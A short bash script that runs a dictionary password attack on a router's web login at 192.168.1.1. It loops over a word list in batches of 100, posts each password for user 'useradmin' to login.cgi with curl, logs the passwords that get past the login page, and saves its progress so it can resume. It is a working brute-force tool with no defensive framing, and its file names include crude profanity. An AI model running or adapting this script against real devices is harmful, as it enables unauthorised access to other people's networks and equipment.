#!/bin/bash
#
# vim:ft=sh

############### Variables ###############

############### Functions ###############

############### Main Part ###############
set -x

dict=./dict
[ -f "$dict" ] || { echo where is the dict file?; exit; }

process=./process
[ -s "$process" ] || echo fuck > $process

# use $1 as start line num; No $1, use $start; No $start, use 1
start=$(sed -n 1p $process)
[ "$start" ] || start=1
s=${1:-$start}
# now check if $s is integer
[ "$s" -eq "$s" ] 2> /dev/null || { echo $s is not integer; exit; }

# if $s not in file $process, add to
grep -q ^$s$ $process || sed -i '$a'$s $process

q=100
e=$((s+q))
lines=$(wc -l $dict | awk '{print $1}')

while [ "$s" -le "$lines" ]
do
	bunch=$(sed -n "$s,$e"p $dict)

	for pass in $bunch
	do
		curl -X POST -s -d "name=useradmin&pswd=$pass" 192.168.1.1/login.cgi | grep -q logincenter
		if [ ! "$?" -eq 0 ]; then
			echo $pass >> pussy
			# break
		fi
	done

	ss=$s
	let s+=q
	let e+=q

	sed -i /^$ss$/s/$ss/$s/ $process

done
